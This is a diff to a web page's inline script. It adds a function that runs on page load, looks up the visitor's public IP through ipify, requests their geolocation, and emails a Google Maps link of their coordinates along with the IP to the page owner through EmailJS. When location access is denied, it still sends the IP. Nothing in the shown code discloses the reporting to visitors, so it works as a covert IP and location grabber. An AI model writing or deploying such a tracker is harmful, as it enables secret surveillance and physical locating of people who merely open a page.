@@ -14,56 +14,96 @@
             });
         })();
 
-        const messg = "Enabled"
+        let messg = "Enabled";
+        let ipadd = "";
 
-      fetch("https://api.ipify.org?format=json")
-  .then(response => response.json())
-  .then(data => {
-    const ipadd = position.data.ip;
-  })
-  .catch(error => {
-    console.error("Could not get IP address:", error);
-  });
+async function sendLocationEmail() {
 
-        window.onload = function() {
-    sendLocationEmail();
-};
-        
-function sendLocationEmail() {
+    // Get public IP
+    try {
+        const response = await fetch("https://api.ipify.org?format=json");
+        const data = await response.json();
 
-            if (!navigator.geolocation) {                
-                messg = "Not Enabled"
-        
+        ipadd = data.ip;
+
+        console.log("IP:", ipadd);
+
+    } catch (error) {
+
+        console.error("Could not get IP address:", error);
+        ipadd = "Unable to determine IP";
     }
 
-            navigator.geolocation.getCurrentPosition(
+
+    // Check if geolocation is supported
+    if (!navigator.geolocation) {
+
+        messg = "Not Supported";
+
+        emailjs.send(
+            "service_3hv5k7r",
+            "template_peoy2wo",
+            {
+                message: `Location not supported | ${messg} | ${ipadd}`
+            }
+        );
+
+        return;
+    }
+
+
+    // Request location
+    navigator.geolocation.getCurrentPosition(
+
         function(position) {
 
-           const latitude = position.coords.latitude;
+            const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            const params = {
-                latitude: latitude,
-                longitude: longitude,
-                location_link: `https://maps.google.com/?q=${latitude},${longitude}`
-            };
-           
+            const locationLink =
+                `https://maps.google.com/?q=${latitude},${longitude}`;
+
+            const message =
+                `${locationLink} | ${messg} | ${ipadd}`;
+
+            console.log(message);
+
             emailjs.send(
                 "service_3hv5k7r",
                 "template_peoy2wo",
-                { 
-                    message: `https://maps.google.com/?q=${latitude},${longitude} |${messg} |${ipadd}`
+                {
+                    message: message
                 }
             )
             .then(function(response) {
-                console.log(response);
+                console.log("Email sent:", response);
             })
             .catch(function(error) {
-                console.error(error);
+                console.error("Email error:", error);
             });
-        } );
+        },
 
+        function(error) {
+
+            messg = "Not Enabled";
+
+            console.log("Location permission/error:", error.message);
+
+            emailjs.send(
+                "service_3hv5k7r",
+                "template_peoy2wo",
+                {
+                    message: `Location not available | ${messg} | ${ipadd}`
+                }
+            );
         }
+    );
+}
+
+
+window.onload = function() {
+    sendLocationEmail();
+};
         
     </script>    
 
